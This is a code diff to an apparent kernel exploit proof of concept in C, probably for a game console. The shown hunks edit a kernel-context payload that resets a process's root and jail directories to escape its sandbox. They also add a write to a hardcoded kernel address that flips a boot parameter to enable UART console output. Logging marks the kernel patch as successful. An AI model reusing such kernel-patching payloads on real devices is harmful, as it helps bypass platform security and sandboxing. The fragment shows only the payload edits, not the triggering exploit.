@@ -127,8 +127,7 @@ struct sendto_args {
 // We are in a normal kernel context here
 void payload(struct knote *kn) {
 	//struct sendto_args args11 = { misock2, dump, 0x1000, 0, NULL, 0 };
-	
-	
+
 	struct thread *td;
 	
 	struct ucred *cred;
@@ -161,6 +160,12 @@ void payload(struct knote *kn) {
 	kprintf("[POC] [+] set rootnode to td_fdp_fd_rdir\n");
 	p_fd->fd_jdir = *(uint64_t *) 0xFFFFFFFF832EF920;
 	kprintf("[POC] [+] set rootnode to td_fdp_fd_jdir\n");
+
+	// bootparam_disable_console_output = 0
+	uint16_t *bootParams = (uint16_t *)0xFFFFFFFF833242F6;
+	*bootParams &= ~(1 << 15);
+	kprintf("[POC] [+] set bootparam_disable_console_output = 0 (ENABLED UART)\n");
+
 	kprintf("[POC] [+] exit from payload\n");
 	
 }
@@ -432,6 +437,11 @@ int main(int argc, char *argv[])
 		return EXIT_SUCCESS;
 	}
 	debugNetPrintf(DEBUG,"[POC] [+] Kernel patch success!\n");
+
+
+	// Enable debug menu
+	uint32_t enable;
+	size_t size;
 	
 	debugNetFinish();
 	return EXIT_SUCCESS;
